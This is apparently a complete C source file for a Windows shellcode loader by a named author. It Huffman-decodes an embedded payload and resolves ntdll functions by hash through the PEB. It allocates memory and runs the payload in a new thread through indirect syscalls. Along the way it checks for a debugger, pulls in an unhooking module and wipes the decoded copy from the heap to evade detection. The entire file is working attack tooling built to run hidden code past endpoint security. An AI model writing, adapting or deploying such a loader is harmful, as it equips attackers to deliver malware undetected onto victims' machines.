/*
    Author : Hossam Ehab
    Date   : 2024-2-12

*/

#include <Windows.h>
#include <stdio.h>
#include <Rpc.h>
#include "huffman.h"
#include "unhooker.c"
#include "payload.h"
#include "structs.h"


#pragma comment(lib, "ntdll")
#define NtCurrentProcess()	   ((HANDLE)-1)
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

void banner() {

    printf("\x1B[38;2;0;255;0m");
    printf("\t    __  __      ________   __                    __         \n");
    printf("\t   / / / /_  __/ __/ __/  / /   ____  ____ _____/ /__  _____\n");
    printf("\t  / /_/ / / / / /_/ /_   / /   / __ \\/ __ `/ __  / _ \\/ ___/\n");
    printf("\t / __  / /_/ / __/ __/  / /___/ /_/ / /_/ / /_/ /  __/ /    \n");
    printf("\t/_/ /_/\\__,_/_/ /_/    /_____/\____/\\__,_/\\__,_/\\___/_/     \n\n");
    printf("\tTitle   : Huffman Coding / Shellcode Obfuscation & Indirect Syscalls Ldr\n");
    printf("\tAuthor  : Hossam Ehab\n");
    printf("\tInfo    : Github: Github.com/0xHossam\n\n");
    printf("\x1B[92m");

}

typedef struct {
    LIST_ENTRY e[3];
    HMODULE base;
    void* entry;
    UINT size;
    UNICODE_STRING dllPath;
    UNICODE_STRING dllname;
} LDR_MODULE;



DWORD calcHash(char* data) {
    DWORD hash = 0x99;
    for (int i = 0; i < strlen(data); i++) {
        hash += data[i] + (hash << 1);
    }
    return hash;
}

static DWORD calcHashModule(LDR_MODULE* mdll) {
    char name[64];
    size_t i = 0;

    while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
        name[i] = (char)mdll->dllname.Buffer[i];
        i++;
    }
    name[i] = 0;
    return calcHash((char*)CharLowerA(name));
}

static HMODULE getModule(DWORD myHash) {
    print(STATUS, "[+] Searching for module with hash: %u (dec) / 0x%lx (hexa) \n", myHash, myHash);

    HMODULE module = NULL;
    PVOID pebPtr = (PVOID)GetPEB(); // Get PEB address from TEB
    INT_PTR peb = (INT_PTR)pebPtr;
    auto ldr = 0x18;
    auto flink = 0x10;

    INT_PTR Mldr = *(INT_PTR*)(peb + ldr);
    INT_PTR M1flink = *(INT_PTR*)(Mldr + flink);
    LDR_MODULE* Mdl = (LDR_MODULE*)M1flink;
    do {
        Mdl = (LDR_MODULE*)Mdl->e[0].Flink;
        if (Mdl->base != NULL) {
            if (calcHashModule(Mdl) == myHash) {
                module = (HMODULE)Mdl->base;
                print(SUCCESS, "[+] Module loaded successfully at address: 0x%p, Module hash = 0x%lx\n", module, myHash);
                return module;
            }
        }
    } while (M1flink != (INT_PTR)Mdl);

    print(FAIL, "[-] Module with hash 0x%lx not found.\n", myHash);
    return module;
}

LPVOID getAPIAddr(HMODULE module, DWORD myHash) {
    if (module == NULL) {
        print(FAIL, "[-] Invalid module handle.\n");
        return NULL;
    }

    print(STATUS, "[+] Searching for API with hash: 0x%lx\n", myHash);

    PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)module;
    if (img_dos_header == NULL) {
        print(FAIL, "[-] Failed to retrieve DOS header.\n");
        return NULL;
    }

    PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)module + img_dos_header->e_lfanew);
    if (img_nt_header == NULL) {
        print(FAIL, "[-] Failed to retrieve NT header.\n");
        return NULL;
    }

    DWORD exportDirVA = img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirVA == 0) {
        print(FAIL, "[-] Export directory not found.\n");
        return NULL;
    }

    PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + exportDirVA);
    PDWORD fAddr = (PDWORD)((LPBYTE)module + img_edt->AddressOfFunctions);
    PDWORD fNames = (PDWORD)((LPBYTE)module + img_edt->AddressOfNames);
    PWORD fOrd = (PWORD)((LPBYTE)module + img_edt->AddressOfNameOrdinals);

    for (DWORD i = 0; i < img_edt->NumberOfNames; i++) {
        LPSTR pFuncName = (LPSTR)((LPBYTE)module + fNames[i]);
        if (calcHash(pFuncName) == myHash) {
            LPVOID addr = (LPVOID)((LPBYTE)module + fAddr[fOrd[i]]);
            print(LINE, "/* ------------------------------------------------------- */\n");
            print(SUCCESS, "[+] API found. Address: 0x%p\n", addr);
            return addr;
        }
    }

    print(FAIL, "[-] API with hash 0x%lx not found.\n", myHash);
    return NULL;
}

BOOL CheckDebugger() {
    return (BOOL)((PEB*)GetPEB())->bBeingDebugged;
}

int main() {

    PVOID BaseAddress = NULL, Shellcode;
    SIZE_T dwSize = 0x1000;

    LPVOID addr = NULL;
    WORD syscallNum;
    SIZE_T ulOrgSize = 0;

    banner();

    if (CheckDebugger()) {
        print(STATUS, "[!] Debugger detected! Exiting...\n");
        return 1; // Exit with failure code
    }

    print(SUCCESS, "[+] No debugger detected. Proceeding...\n");


    // Load the ntdll.dll module
    HMODULE mod = getModule(0x3e8557); // Hash of ntdll.dll
    if (mod == NULL) {
        print(FAIL, "[!] Error loading ntdll.dll module.\n");
        return 1;
    }

    // Deobfuscating the payload using Huffman Coding Algorithm 
    Shellcode = huffman_decode((PBYTE)payload, payload_size, TRUE, &ulOrgSize);

    if (!Shellcode)
    {
        print(FAIL, "[-] Huffman Coding algorithm has failed to decompress the payload !");
        return 1;
    }

    /*
        DEBUGGING :

        printf("The ulOrgSize size : %d", ulOrgSize);
        printf("The macros size : %d", payload_size);
        printf("size = %d\n", sizeof(HuffmanItem));

    */

    if (ulOrgSize > payload_size)

        print(STATUS, "[+] Huffman Coding Algorithm had succeeded to reduce %.2f%% from the original size\n", (1.0 - (double)payload_size / ulOrgSize) * 100.0);


    addr = getAPIAddr(mod, 0x112da6be2b35);	// hash of ZwAllocateVirtualMemory
    if ((syscallNum = FindAmmunitionsAndPrepareGun(addr)) == INVALID_SSN)
        return 1;

    AmmunitionPrepare(syscallNum);
    dwSize = ulOrgSize;

    NTSTATUS status = GunFire(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        print(FAIL, "[!] Failed to allocate memory (0x%lx).\n", status);
        return 2;
    }
    else {
        print(SUCCESS, "[+] Memory allocated for payload execution.\n");
    }

    for (SIZE_T i = 0; i < ulOrgSize; i++)
        ((PBYTE)BaseAddress)[i] = ((PBYTE)Shellcode)[i];

    print(SUCCESS, "[+] Payload copied to allocated memory successfully.\n");

    // Get rid of the malicious instructions from the main heap
    ZeroMemory(Shellcode, ulOrgSize);
    free(Shellcode);


    DWORD OldProtect = 0;

    addr = getAPIAddr(mod, 0x59ef896aad4); // Hash of NtProtectVirtualMemory
    if ((syscallNum = FindAmmunitionsAndPrepareGun(addr)) == INVALID_SSN)
        return 1;

    AmmunitionPrepare(syscallNum);

    NTSTATUS NtProtectStatus = GunFire(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus)) {
        print(FAIL, "[!] Failed in sysNtProtectVirtualMemory (0x%lx).\n", NtProtectStatus);
        return 3;
    }
    else {
        print(SUCCESS, "[+] Memory permissions updated to execute the payload.\n");
    }


    HANDLE hHostThread = INVALID_HANDLE_VALUE;

    addr = getAPIAddr(mod, 0x1f7ecc338); // Hash of NtCreateThreadEx
    if ((syscallNum = FindAmmunitionsAndPrepareGun(addr)) == INVALID_SSN)
        return 1;

    AmmunitionPrepare(syscallNum);

    NTSTATUS NtCreateThreadStatus = GunFire(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(NtCreateThreadStatus)) {
        print(FAIL, "[!] Failed in sysNtCreateThreadEx (0x%lx).\n", NtCreateThreadStatus);
        return 4;
    }
    else {
        print(SUCCESS, "[+] Payload execution thread created successfully.\n");
    }

    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;

    addr = getAPIAddr(mod, 0x1dfafc993bc); // Hash of NtWaitForSingleObject
    if ((syscallNum = FindAmmunitionsAndPrepareGun(addr)) == INVALID_SSN)
        return 1;

    AmmunitionPrepare(syscallNum);

    NTSTATUS NTWFSOStatus = GunFire(hHostThread, FALSE, &Timeout);
    if (!NT_SUCCESS(NTWFSOStatus)) {
        print(FAIL, "[!] Failed in sysNtWaitForSingleObject (0x%lx).\n", NTWFSOStatus);
        return 5;
    }
    else {
        print(SUCCESS, "[+] Payload execution completed successfully.\n");
    }

    return 0;

}
